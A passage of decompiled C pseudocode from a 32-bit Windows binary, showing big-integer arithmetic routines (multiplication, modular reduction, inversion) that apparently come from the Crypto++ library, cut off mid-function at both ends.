          vars60 = 60;
          v8 = sub_40EE85(&vars18, v11, (int *)this);
          v25 = 9;
          v16 = 124;
        }
        v12 = v16;
        vars60 = v16;
        sub_40E80A(a2, v8);
        v13 = v12 | 1;
        if ( (v13 & 0x40) != 0 )
        {
          v13 &= ~0x40u;
          sub_40891D((int)&vars1C);
        }
        if ( (v13 & 0x20) != 0 )
        {
          v13 &= ~0x20u;
          sub_40891D((int)&vars4);
        }
        if ( (v13 & 0x10) != 0 )
        {
          v13 &= ~0x10u;
          sub_40891D((int)v24);
        }
        if ( (v13 & 8) != 0 )
        {
          v13 &= ~8u;
          sub_40891D((int)v22);
        }
        if ( (v13 & 4) != 0 )
        {
          v13 &= ~4u;
          sub_40891D((int)&vars4C);
        }
        if ( (v13 & 2) != 0 )
          sub_40891D((int)v20);
        v4 = vars34;
        goto LABEL_3;
      }
      v6 = sub_4128E4();
    }
    sub_40E80A(a2, v6);
    return a2;
  }
  sub_4121D5((int *)this, &vars48, (int *)a3);
  v25 = 0;
  sub_411D65(a2, a3);
  v4 = &vars4C;
LABEL_3:
  sub_40891D((int)v4);
  return a2;
}
// 411D65: using guessed type char var_54[4];
// 411D65: using guessed type char var_20[20];
// 411D65: using guessed type char var_38[20];
// 411D65: using guessed type char var_50[20];

//----- (00411FD1) --------------------------------------------------------
char sub_411FD1()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return byte_491D11;
}
// 491D08: using guessed type char byte_491D08;
// 491D11: using guessed type char byte_491D11;

//----- (00411FE5) --------------------------------------------------------
char __stdcall sub_411FE5(int *a1)
{
  return sub_411FF1(a1);
}

//----- (00411FF1) --------------------------------------------------------
char __thiscall sub_411FF1(int *this)
{
  _DWORD *v1; // esi
  int v2; // eax
  char v3; // cl

  v1 = (_DWORD *)this[4];
  v2 = sub_4113F2((int)v1, this[3]);
  v3 = 1;
  if ( v2 != 1 || *v1 != 1 )
    return 0;
  return v3;
}

//----- (00412011) --------------------------------------------------------
char __thiscall sub_412011(void *this, int a2)
{
  int *v2; // eax
  char v3; // bl
  char v5[4]; // [esp+4h] [ebp-18h] BYREF
  char v6[20]; // [esp+8h] [ebp-14h] BYREF

  v2 = (int *)sub_411BDF(v5, a2, (int)this + 12);
  v3 = sub_411FF1(v2);
  sub_40891D((int)v6);
  return v3;
}
// 412011: using guessed type char var_18[4];
// 412011: using guessed type char var_14[20];

//----- (00412045) --------------------------------------------------------
unsigned int __thiscall sub_412045(int *this, int a2)
{
  char v3; // bl
  unsigned int *v4; // ecx
  unsigned int v5; // esi
  unsigned int result; // eax
  int *v7; // eax
  void *v8; // eax
  char v9; // al
  int v10; // [esp+10h] [ebp-48h] BYREF
  char v11[20]; // [esp+14h] [ebp-44h] BYREF
  char v12[4]; // [esp+28h] [ebp-30h] BYREF
  char v13[20]; // [esp+2Ch] [ebp-2Ch] BYREF
  int v14; // [esp+40h] [ebp-18h] BYREF
  unsigned int v15; // [esp+44h] [ebp-14h] BYREF
  int v16; // [esp+48h] [ebp-10h]
  int v17; // [esp+54h] [ebp-4h]

  v16 = 0;
  v15 = sub_410FD0(this);
  v3 = 1;
  v4 = &v15;
  v14 = 1;
  if ( v15 <= 1 )
    v4 = (unsigned int *)&v14;
  v5 = *v4;
  if ( !a2 )
    return *v4;
  if ( this[5] != 1 && sub_411C4F(this, v5 - 1) < 0 )
    ++v5;
  if ( this[5] != 1
    || (v7 = sub_412D4C(&v10, 8 * v5 - 1),
        v17 = 0,
        v14 = 1,
        v8 = sub_40EDE5(v7, v12),
        v16 = 3,
        sub_41128E(this, (int)v8) >= 0) )
  {
    v3 = 0;
  }
  v9 = v16;
  if ( (v16 & 2) != 0 )
  {
    v16 &= ~2u;
    sub_40891D((int)v13);
    v9 = v16;
  }
  if ( (v9 & 1) != 0 )
    sub_40891D((int)v11);
  result = v5 + 1;
  if ( !v3 )
    return v5;
  return result;
}
// 412095: conditional instruction was optimized away because %arg_0.4!=0
// 412045: using guessed type char var_30[4];
// 412045: using guessed type char var_2C[20];
// 412045: using guessed type char var_44[20];

//----- (0041210D) --------------------------------------------------------
_DWORD *__thiscall sub_41210D(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  unsigned int *v4; // ecx
  int v5; // edi
  int v7; // [esp-Ch] [ebp-30h]
  int v8; // [esp-8h] [ebp-2Ch]
  int v9; // [esp-4h] [ebp-28h]
  unsigned int v10; // [esp+14h] [ebp-10h] BYREF
  int v11; // [esp+20h] [ebp-4h]

  v11 = 0;
  v4 = &a3;
  v5 = a3;
  v10 = this[3];
  a3 = *(_DWORD *)(a3 + 12);
  if ( v10 >= a3 )
    v4 = &v10;
  sub_40E7BF(a2, 0, *v4);
  v11 = 0;
  if ( this[5] == 1 )
  {
    if ( *(_DWORD *)(v5 + 20) != 1 )
    {
      sub_412978(a2, (int)this, v5);
      a2[5] = 1;
      return a2;
    }
    v9 = (int)this;
    v8 = v5;
    v7 = (int)a2;
LABEL_9:
    sub_412C28(v7, v8, v9);
    return a2;
  }
  v9 = v5;
  v8 = (int)this;
  v7 = (int)a2;
  if ( *(_DWORD *)(v5 + 20) != 1 )
    goto LABEL_9;
  sub_412978(a2, (int)this, v5);
  return a2;
}

//----- (00412194) --------------------------------------------------------
int __thiscall sub_412194(void *this, int *a2, int *a3)
{
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = sub_40EEA2(&v7, a2, a3);
  v9 = 0;
  v5 = sub_40EC6C((int)this + 36, v4);
  sub_40891D((int)v8);
  return v5;
}
// 412194: using guessed type char var_20[28];

//----- (004121D5) --------------------------------------------------------
int *__thiscall sub_4121D5(int *this, int *a2, int *a3)
{
  int v5; // [esp+10h] [ebp-28h] BYREF
  char v6[20]; // [esp+14h] [ebp-24h] BYREF
  int v7; // [esp+28h] [ebp-10h]
  int v8; // [esp+34h] [ebp-4h]

  sub_40E940(a2);
  v8 = 0;
  v7 = 1;
  sub_40E940(&v5);
  v8 = 1;
  sub_4118C4(a2, &v5, this, a3);
  sub_40891D((int)v6);
  return a2;
}
// 4121D5: using guessed type char var_24[20];

//----- (0041222B) --------------------------------------------------------
int __thiscall sub_41222B(int *this, unsigned int a2)
{
  int *v2; // ebx
  int v3; // eax
  int v4; // edx
  int v5; // edi
  _DWORD *v6; // ebp
  unsigned int v7; // ecx
  unsigned int v8; // ebp
  _DWORD *v9; // eax
  unsigned __int64 v11; // [esp-18h] [ebp-50h]
  _DWORD pExceptionObject[10]; // [esp+Ch] [ebp-2Ch] BYREF

  v2 = this;
  if ( !a2 )
  {
    sub_40E776(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  if ( ((a2 - 1) & a2) != 0 )
  {
    v3 = sub_4113F2(this[4], this[3]);
    v4 = 0;
    v5 = v3;
    if ( a2 <= 5 )
    {
      v7 = 0;
      v8 = 0;
      if ( v3 )
      {
        v9 = (_DWORD *)(v2[4] + 4 * v3);
        do
        {
          v8 = ((unsigned int)*--v9 + __PAIR64__(v8, v7)) >> 32;
          v7 += *v9;
          --v5;
        }
        while ( v5 );
      }
      v4 = __PAIR64__(v8, v7) % a2;
    }
    else if ( v3 )
    {
      v6 = (_DWORD *)(v2[4] + 4 * v3);
      do
      {
        HIDWORD(v11) = v4;
        LODWORD(v11) = *--v6;
        v4 = v11 % a2;
        --v5;
      }
      while ( v5 );
      v2 = this;
    }
  }
  else
  {
    v4 = (a2 - 1) & *(_DWORD *)this[4];
  }
  if ( v2[5] == 1 && v4 )
    return a2 - v4;
  return v4;
}
// 41222B: using guessed type _DWORD pExceptionObject[10];

//----- (004122FF) --------------------------------------------------------
errno_t __cdecl sub_4122FF(void *Destination, int a2, int a3, int a4, int a5, int a6)
{
  int v8; // esi

  sub_41302C((int)Destination, a2, a3, a5, a6);
  sub_4126C7(a2, a2 + 4 * a6, a3, (int)Destination, a4, a6);
  v8 = off_48C068(a6, a2, a3 + 4 * a6, a2);
  off_48C064(a2, a4);
  return sub_4113D1(Destination, (void *)(a2 + 4 * (a6 & -v8)), a6);
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00412375) --------------------------------------------------------
int __thiscall sub_412375(int *this)
{
  int *v2; // eax
  int *v3; // eax
  int v4; // esi
  int v6; // [esp+10h] [ebp-3Ch] BYREF
  char v7[20]; // [esp+14h] [ebp-38h] BYREF
  int v8; // [esp+28h] [ebp-24h] BYREF
  char v9[28]; // [esp+2Ch] [ebp-20h] BYREF
  int v10; // [esp+48h] [ebp-4h]

  v2 = sub_412D4C(&v6, 32 * this[6]);
  v10 = 0;
  v3 = sub_40EEA2(&v8, v2, this + 3);
  LOBYTE(v10) = 1;
  v4 = sub_40EC6C((int)(this + 15), v3);
  sub_40891D((int)v9);
  sub_40891D((int)v7);
  return v4;
}
// 412375: using guessed type char var_20[28];
// 412375: using guessed type char var_38[20];

//----- (004123CF) --------------------------------------------------------
int __thiscall sub_4123CF(void *this, int *a2)
{
  int *v3; // eax
  int v4; // esi
  char v6[4]; // [esp+10h] [ebp-24h] BYREF
  char v7[28]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v3 = (int *)sub_41240A(a2, v6);
  v8 = 0;
  v4 = sub_40EC6C((int)this + 36, v3);
  sub_40891D((int)v7);
  return v4;
}
// 4123CF: using guessed type char var_24[4];
// 4123CF: using guessed type char var_20[28];

//----- (0041240A) --------------------------------------------------------
void *__thiscall sub_41240A(int *this, void *a2)
{
  int *v2; // esi

  v2 = this;
  if ( !sub_411FF1(this) )
    v2 = sub_41C5B0();
  sub_40E80A(a2, v2);
  return a2;
}

//----- (00412438) --------------------------------------------------------
int __thiscall sub_412438(void *this, int a2)
{
  int *v3; // eax
  int v4; // esi
  char v6[4]; // [esp+10h] [ebp-24h] BYREF
  char v7[28]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v3 = (int *)sub_411D65(a2, v6, (int)this + 12);
  v8 = 0;
  v4 = sub_40EC6C((int)this + 60, v3);
  sub_40891D((int)v7);
  return v4;
}
// 412438: using guessed type char var_24[4];
// 412438: using guessed type char var_20[28];

//----- (00412477) --------------------------------------------------------
_DWORD *__thiscall sub_412477(_DWORD *this, int a2)
{
  int v3; // edi
  _BYTE *v4; // ebp
  int v5; // eax
  char *v6; // eax
  int v7; // ecx
  int v9; // [esp-8h] [ebp-20h]
  char *v10; // [esp+10h] [ebp-8h]

  v3 = this[6];
  v4 = (_BYTE *)this[13];
  v10 = (char *)this[30];
  sub_4113D1(v10, *(void **)(a2 + 16), *(_DWORD *)(a2 + 12));
  v5 = *(_DWORD *)(a2 + 12);
  if ( 2 * v3 != v5 )
    memset(&v10[4 * v5], 0, 4 * (2 * v3 - v5));
  sub_4122FF(v4, (int)&v10[8 * v3], (int)v10, this[7], this[25], v3);
  v6 = sub_40F2D8(v4, v10, v4, v3, (void *)this[7], v3);
  v7 = 32 * v3;
  v9 = this[7];
  if ( (unsigned int)v6 <= 32 * v3 )
    sub_41266E(v4, v4, v7 - (_DWORD)v6, v9, v3);
  else
    sub_411977(v4, v4, (int)&v6[-v7], v9, v3);
  return this + 9;
}

//----- (00412510) --------------------------------------------------------
int __thiscall sub_412510(void *this, void *a2, int a3)
{
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = sub_40ED2F(&v7, a2, a3);
  v9 = 0;
  v5 = sub_40EC6C((int)this + 36, v4);
  sub_40891D((int)v8);
  return v5;
}
// 412510: using guessed type char var_20[28];

//----- (00412551) --------------------------------------------------------
char __cdecl sub_412551(int *a1, int a2, int a3)
{
  char result; // al

  sub_412B99((int)a1, a2, a3);
  result = *(_DWORD *)(a3 + 20) != 1;
  if ( (*(_DWORD *)(a2 + 20) != 1) != result )
    return sub_4128A1(a1);
  return result;
}

//----- (00412587) --------------------------------------------------------
int __thiscall sub_412587(int *this, void *a2, int a3)
{
  int *v4; // eax
  int *v5; // eax
  int v6; // esi
  int v8; // [esp+10h] [ebp-3Ch] BYREF
  char v9[20]; // [esp+14h] [ebp-38h] BYREF
  int v10; // [esp+28h] [ebp-24h] BYREF
  char v11[28]; // [esp+2Ch] [ebp-20h] BYREF
  int v12; // [esp+48h] [ebp-4h]

  v4 = sub_40ED2F(&v8, a2, a3);
  v12 = 0;
  v5 = sub_40EEA2(&v10, v4, this + 3);
  LOBYTE(v12) = 1;
  v6 = sub_40EC6C((int)(this + 15), v5);
  sub_40891D((int)v11);
  sub_40891D((int)v9);
  return v6;
}
// 412587: using guessed type char var_20[28];
// 412587: using guessed type char var_38[20];

//----- (004125E2) --------------------------------------------------------
_DWORD *__thiscall sub_4125E2(_DWORD *this, int a2, int a3)
{
  unsigned int *v4; // ebp
  int v5; // eax
  int v6; // esi
  int v7; // ecx
  int v9; // [esp+10h] [ebp-8h]
  void *Destination; // [esp+14h] [ebp-4h]

  v4 = (unsigned int *)this[30];
  Destination = (void *)this[13];
  v9 = this[6];
  sub_40F52D(
    v4,
    (int)&v4[2 * v9],
    *(unsigned int **)(a2 + 16),
    *(_DWORD *)(a2 + 12),
    *(unsigned int **)(a3 + 16),
    *(_DWORD *)(a3 + 12));
  v5 = *(_DWORD *)(a2 + 12);
  v6 = *(_DWORD *)(a3 + 12);
  v7 = 2 * v9 - v6 - v5;
  if ( v7 )
    memset(&v4[v6 + v5], 0, 4 * v7);
  sub_4122FF(Destination, (int)&v4[2 * v9], (int)v4, this[7], this[25], v9);
  return this + 9;
}

//----- (0041266E) --------------------------------------------------------
errno_t __cdecl sub_41266E(void *Destination, void *Source, int a3, int a4, int a5)
{
  errno_t result; // eax

  result = sub_4113D1(Destination, Source, a5);
  while ( a3 )
  {
    --a3;
    if ( !sub_41C142((int)Destination, a5, 1) )
    {
      result = sub_411259((int)Destination, a4, a5);
      if ( result < 0 )
        continue;
    }
    result = off_48C068(a5, Destination, Destination, a4);
  }
  return result;
}
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004126C7) --------------------------------------------------------
int __cdecl sub_4126C7(int a1, int a2, int a3, int a4, int a5, unsigned int a6)
{
  int v7; // ebx
  int v8; // eax
  unsigned int v9; // ecx
  int v10; // edi
  int v11; // esi
  bool v12; // zf
  unsigned int *v13; // ebx
  BOOL v14; // esi
  int v15; // edi
  int v16; // edi
  int v17; // eax
  unsigned int v18; // [esp+0h] [ebp-Ch]
  unsigned int *v19; // [esp+4h] [ebp-8h]
  unsigned int v20; // [esp+8h] [ebp-4h]
  int v21; // [esp+24h] [ebp+18h]

  if ( a6 <= dword_48C06C )
    return ((int (__cdecl *)(int, int, int, _DWORD))dword_490CA8[a6 >> 2])(a1, a4, a5, *(_DWORD *)(a3 + 4 * a6 - 4));
  v7 = a6 >> 1;
  v18 = a6 >> 1;
  v8 = sub_411259(a4, a4 + 4 * (a6 >> 1), a6 >> 1);
  v9 = a6 >> 1;
  if ( v8 > 0 )
    v9 = 0;
  v20 = v9;
  off_48C068(v7, a1, a4 + 4 * v9, a4 + 4 * (v7 ^ v9));
  v10 = a5 + 4 * v7;
  if ( sub_411259(a5, v10, v7) > 0 )
    v7 = 0;
  v19 = (unsigned int *)(a1 + 4 * v18);
  off_48C068(v18, v19, a5 + 4 * v7, a5 + 4 * (v18 ^ v7));
  sub_412E84(a2, a2 + 4 * a6, a1, (int)v19, v18);
  sub_412E84(a1, a2 + 4 * a6, a4 + 4 * (a6 >> 1), v10, v18);
  v11 = off_48C068(v18, a2 + 4 * a6, a3 + 4 * v18, a3);
  v12 = v20 == v7;
  v13 = (unsigned int *)(a2 + 4 * a6);
  if ( v12 )
  {
    v21 = v11 - off_48C064(v13, a2);
    v14 = sub_411259((int)v13, a1, v18) == -1;
    v15 = v14 - off_48C068(v18, v13, v13, a2 + 4 * v18);
  }
  else
  {
    v21 = off_48C068(v18, a2 + 4 * a6, v13, a2) + v11;
    v14 = sub_411259((int)v13, a1, v18) == -1;
    v15 = v14 + off_48C064(v13, a2 + 4 * v18);
  }
  if ( v14 + v21 < 0 )
    v16 = v15 - sub_4115F5(v13, v18, -(v14 + v21));
  else
    v16 = sub_411C95(v13, v18, v14 + v21) + v15;
  v17 = off_48C064(v13, v19);
  return sub_411C95(v19, v18, v17 + v16);
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 48C06C: using guessed type int dword_48C06C;
// 490CA8: using guessed type int dword_490CA8[];

//----- (004128A1) --------------------------------------------------------
char __thiscall sub_4128A1(int *this)
{
  int v2; // eax

  LOBYTE(v2) = sub_40ED09(this);
  if ( !(_BYTE)v2 )
  {
    v2 = 1 - this[5];
    this[5] = v2;
  }
  return v2;
}

//----- (004128B8) --------------------------------------------------------
void *__thiscall sub_4128B8(int this, int a2)
{
  void *result; // eax

  result = sub_40E4FF(this, *(void **)(this + 12), *(_DWORD *)(this + 8), a2, 0);
  *(_DWORD *)(this + 8) = a2;
  *(_DWORD *)(this + 12) = result;
  *(_DWORD *)(this + 4) = 0x3FFFFFFF;
  return result;
}

//----- (004128E4) --------------------------------------------------------
_DWORD *sub_4128E4()
{
  _DWORD *result; // eax
  int v1; // esi

  if ( dword_490CDC > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_490CDC);
    if ( dword_490CDC == -1 )
    {
      dword_490CD8 = 0;
      atexit(sub_469F31);
      _Init_thread_footer(&dword_490CDC);
    }
  }
  result = (_DWORD *)dword_490CD8;
  if ( !dword_490CD8 )
  {
    result = sub_40EEBF();
    v1 = dword_490CD8;
    if ( dword_490CD8 )
    {
      if ( result )
        (*(void (__thiscall **)(_DWORD *, int))*result)(result, 1);
      return (_DWORD *)v1;
    }
    else
    {
      dword_490CD8 = (int)result;
    }
  }
  return result;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 490CD8: using guessed type int dword_490CD8;
// 490CDC: using guessed type int dword_490CDC;
// 492450: using guessed type int TlsIndex;

//----- (004128F1) --------------------------------------------------------
_DWORD *__thiscall sub_4128F1(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  unsigned int *v4; // ecx
  int v5; // edi
  int v7; // [esp-Ch] [ebp-30h]
  int v8; // [esp-8h] [ebp-2Ch]
  int v9; // [esp-4h] [ebp-28h]
  unsigned int v10; // [esp+14h] [ebp-10h] BYREF
  int v11; // [esp+20h] [ebp-4h]

  v11 = 0;
  v4 = &a3;
  v5 = a3;
  v10 = this[3];
  a3 = *(_DWORD *)(a3 + 12);
  if ( v10 >= a3 )
    v4 = &v10;
  sub_40E7BF(a2, 0, *v4);
  v11 = 0;
  if ( this[5] == 1 )
  {
    if ( *(_DWORD *)(v5 + 20) == 1 )
    {
      sub_412978(a2, (int)this, v5);
      a2[5] = 1;
      return a2;
    }
    v9 = (int)this;
    v8 = v5;
    v7 = (int)a2;
    goto LABEL_8;
  }
  v9 = v5;
  v8 = (int)this;
  v7 = (int)a2;
  if ( *(_DWORD *)(v5 + 20) == 1 )
  {
LABEL_8:
    sub_412C28(v7, v8, v9);
    return a2;
  }
  sub_412978(a2, (int)this, v5);
  return a2;
}

//----- (00412978) --------------------------------------------------------
int __cdecl sub_412978(_DWORD *a1, int a2, int a3)
{
  unsigned int v3; // ecx
  int v4; // edi
  int v5; // ecx
  int v6; // edx
  int result; // eax
  int v8; // [esp-8h] [ebp-18h]
  int v9; // [esp-4h] [ebp-14h]

  v3 = *(_DWORD *)(a2 + 12);
  v9 = *(_DWORD *)(a3 + 16);
  v8 = *(_DWORD *)(a2 + 16);
  if ( v3 == *(_DWORD *)(a3 + 12) )
  {
    result = off_48C064(v8, v9);
  }
  else
  {
    if ( v3 <= *(_DWORD *)(a3 + 12) )
    {
      v4 = off_48C064(v8, v9);
      sub_4113D1(
        (void *)(4 * *(_DWORD *)(a2 + 12) + a1[4]),
        (void *)(4 * *(_DWORD *)(a2 + 12) + *(_DWORD *)(a3 + 16)),
        *(_DWORD *)(a3 + 12) - *(_DWORD *)(a2 + 12));
      v6 = *(_DWORD *)(a2 + 12);
      v5 = *(_DWORD *)(a3 + 12);
    }
    else
    {
      v4 = off_48C064(v8, v9);
      sub_4113D1(
        (void *)(4 * *(_DWORD *)(a3 + 12) + a1[4]),
        (void *)(4 * *(_DWORD *)(a3 + 12) + *(_DWORD *)(a2 + 16)),
        *(_DWORD *)(a2 + 12) - *(_DWORD *)(a3 + 12));
      v5 = *(_DWORD *)(a2 + 12);
      v6 = *(_DWORD *)(a3 + 12);
    }
    result = sub_411C95((unsigned int *)(a1[4] + 4 * v6), v5 - v6, v4);
  }
  if ( result )
  {
    sub_411181((int)(a1 + 1), 2 * a1[3]);
    result = a1[4];
    *(_DWORD *)(result + 4 * (a1[3] >> 1)) = 1;
  }
  a1[5] = 0;
  return result;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);

//----- (00412A4E) --------------------------------------------------------
int __thiscall sub_412A4E(int *this, int a2)
{
  int v2; // edi
  unsigned int v3; // esi
  int v4; // ebx
  unsigned int v5; // eax

  v2 = this[4];
  v3 = sub_4113F2(v2, this[3]);
  v4 = *(_DWORD *)(a2 + 16);
  v5 = sub_4113F2(v4, *(_DWORD *)(a2 + 12));
  if ( v3 == v5 )
    return sub_411259(v2, v4, v3);
  else
    return v5 < v3 ? 1 : -1;
}

//----- (00412A91) --------------------------------------------------------
void __cdecl sub_412A91(int a1, int a2, int *a3, int a4)
{
  void *v4; // eax
  unsigned int v5; // eax
  int *v6; // eax
  unsigned int v7; // esi
  int v8; // eax
  void *v9; // eax
  int v10; // eax
  int v11; // [esp-Ch] [ebp-70h]
  int v12; // [esp-8h] [ebp-6Ch]
  int v13; // [esp-4h] [ebp-68h]
  void *v14[4]; // [esp+10h] [ebp-54h] BYREF
  int v15; // [esp+20h] [ebp-44h]
  int v16; // [esp+24h] [ebp-40h]
  void *v17; // [esp+28h] [ebp-3Ch]
  _DWORD pExceptionObject[14]; // [esp+2Ch] [ebp-38h] BYREF

  v13 = a3[3];
  v16 = a2;
  v12 = a3[4];
  v15 = a4;
  v4 = (void *)sub_4113F2(v12, v13);
  v11 = *(_DWORD *)(a4 + 12);
  v17 = v4;
  v5 = sub_4113F2(*(_DWORD *)(a4 + 16), v11);
  if ( !v5 )
  {
    sub_40E776(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  if ( (unsigned int)v17 >= v5 )
  {
    v17 = (char *)v17 + ((unsigned __int8)v17 & 1);
    v7 = (v5 & 1) + v5;
    v8 = sub_413329(v7);
    sub_4111C8(a1 + 4, v8);
    v9 = v17;
    *(_DWORD *)(a1 + 20) = 0;
    v10 = sub_413329((unsigned int)v9 - v7 + 2);
    sub_4111C8(v16 + 4, v10);
    *(_DWORD *)(v16 + 20) = 0;
    sub_40E6B1(v14, (unsigned int)v17 + 3 * v7 + 6);
    pExceptionObject[13] = 0;
    sub_41166F(
      *(void **)(a1 + 16),
      *(_DWORD *)(v16 + 16),
      (_DWORD *)v14[3],
      (void *)a3[4],
      (char *)v17,
      *(_DWORD **)(v15 + 16),
      v7);
    sub_40891D((int)v14);
  }
  else
  {
    sub_40EC6C(a1, a3);
    *(_DWORD *)(a1 + 20) = 0;
    v6 = sub_41C5B0();
    sub_40EC6C(v16, v6);
  }
}

//----- (00412B99) --------------------------------------------------------
void __cdecl sub_412B99(int a1, int a2, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // ebx
  unsigned int v6; // esi
  int v7; // eax
  int v8[4]; // [esp+10h] [ebp-20h] BYREF
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = sub_4113F2(*(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 12));
  v9 = sub_413329(v3);
  v4 = sub_4113F2(*(_DWORD *)(a3 + 16), *(_DWORD *)(a3 + 12));
  v5 = sub_413329(v4);
  v6 = v5 + v9;
  v7 = sub_413329(v5 + v9);
  sub_4111C8(a1 + 4, v7);
  *(_DWORD *)(a1 + 20) = 0;
  sub_40E6B1(v8, v6);
  v10 = 0;
  sub_40F52D(*(unsigned int **)(a1 + 16), v8[3], *(unsigned int **)(a2 + 16), v9, *(unsigned int **)(a3 + 16), v5);
  sub_40891D((int)v8);
}

//----- (00412C28) --------------------------------------------------------
int __cdecl sub_412C28(int a1, int a2, int a3)
{
  int v3; // esi
  int v4; // eax
  unsigned int v5; // ebp
  int v6; // ebx
  int v7; // eax
  int v8; // ecx
  int v9; // edi
  int v10; // eax
  unsigned int v11; // ebp
  int v12; // edi
  int v13; // esi
  int result; // eax
  int v15; // esi

  v3 = *(_DWORD *)(a2 + 16);
  v4 = sub_4113F2(v3, *(_DWORD *)(a2 + 12));
  v5 = (v4 & 1) + v4;
  v6 = *(_DWORD *)(a3 + 16);
  v7 = sub_4113F2(v6, *(_DWORD *)(a3 + 12));
  v8 = v7 & 1;
  v9 = v8 + v7;
  if ( v5 <= v8 + v7 )
  {
    if ( v5 == v8 + v7 )
    {
      if ( sub_411259(v3, v6, v5) < 0 )
      {
        result = off_48C068(v5, *(_DWORD *)(a1 + 16), v6, v3);
        *(_DWORD *)(a1 + 20) = 1;
      }
      else
      {
        result = off_48C068(v5, *(_DWORD *)(a1 + 16), v3, v6);
        *(_DWORD *)(a1 + 20) = 0;
      }
    }
    else
    {
      v15 = off_48C068(v5, *(_DWORD *)(a1 + 16), *(_DWORD *)(a3 + 16), v3);
      sub_4113D1((void *)(4 * v5 + *(_DWORD *)(a1 + 16)), (void *)(4 * v5 + *(_DWORD *)(a3 + 16)), v9 - v5);
      result = sub_4115F5((unsigned int *)(4 * v5 + *(_DWORD *)(a1 + 16)), v9 - v5, v15);
      *(_DWORD *)(a1 + 20) = 1;
    }
  }
  else
  {
    v10 = off_48C068(v9, *(_DWORD *)(a1 + 16), v3, *(_DWORD *)(a3 + 16));
    v11 = v5 - v9;
    v12 = 4 * v9;
    v13 = v10;
    sub_4113D1((void *)(v12 + *(_DWORD *)(a1 + 16)), (void *)(v12 + *(_DWORD *)(a2 + 16)), v11);
    result = sub_4115F5((unsigned int *)(v12 + *(_DWORD *)(a1 + 16)), v11, v13);
    *(_DWORD *)(a1 + 20) = 0;
  }
  return result;
}
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00412D4C) --------------------------------------------------------
_DWORD *__cdecl sub_412D4C(_DWORD *a1, unsigned int a2)
{
  sub_40E7BF(a1, 0, (a2 + 32) >> 5);
  sub_41BFA5(a1, a2, 1);
  return a1;
}

//----- (00412D8F) --------------------------------------------------------
int __cdecl sub_412D8F(int a1, unsigned int *a2, _DWORD *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  int v5; // edi
  unsigned int v7; // esi
  int v8; // edx

  if ( a4 == 2 )
  {
    v7 = 3;
    v8 = *a3 & 7;
    do
    {
      v7 *= 2;
      v8 *= 2 - *a3 * v8;
    }
    while ( v7 < 0x20 );
    a2[1] = 0;
    *a2 = v8;
    dword_490C60(a2 + 2, a2, a3);
    sub_41C57A(a2 + 2, 2u);
    sub_411C95(a2 + 2, 2u, 2);
    return dword_490C60(a1, a2, a2 + 2);
  }
  else
  {
    v4 = a4 >> 1;
    sub_412D8F(a1, a2, a3, a4 >> 1);
    *a2 = 1;
    if ( a4 >> 1 != 1 )
      memset(a2 + 1, 0, 4 * ((a4 >> 1) - 1));
    v5 = a1 + 4 * v4;
    sub_4126C7(v5, (int)&a2[v4], (int)a2, a1, (int)a3, v4);
    sub_41302C((int)a2, (int)&a2[v4], a1, (int)&a3[v4], v4);
    off_48C064(v5, a2);
    sub_41C57A(a2, v4);
    return sub_41302C(v5, (int)&a2[v4], a1, (int)a2, v4);
  }
}
// 490C60: invalid function type 'int dword_490C60[]' has been ignored
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 490C60: using guessed type int (__cdecl *dword_490C60)(_DWORD, _DWORD, _DWORD);

//----- (00412E84) --------------------------------------------------------
int __cdecl sub_412E84(int a1, int a2, int a3, int a4, unsigned int a5)
{
  unsigned int v6; // edi
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // edi
  int v10; // eax
  unsigned int v11; // ecx
  int v12; // esi
  int v13; // ebp
  int v14; // esi
  int v16; // esi
  int v17; // esi
  int v18; // eax
  unsigned int v19; // [esp+0h] [ebp-14h]
  int v20; // [esp+4h] [ebp-10h]
  int v21; // [esp+4h] [ebp-10h]
  unsigned int *v22; // [esp+8h] [ebp-Ch]
  unsigned int v23; // [esp+Ch] [ebp-8h]
  unsigned int v24; // [esp+10h] [ebp-4h]
  unsigned int *v25; // [esp+28h] [ebp+14h]

  if ( a5 <= dword_48C06C )
    return ((int (__cdecl *)(int, int, int))dword_490C3C[a5 >> 2])(a1, a3, a4);
  v6 = a5 >> 1;
  v19 = a5 >> 1;
  v7 = sub_411259(a3, a3 + 4 * (a5 >> 1), a5 >> 1);
  v8 = a5 >> 1;
  if ( v7 > 0 )
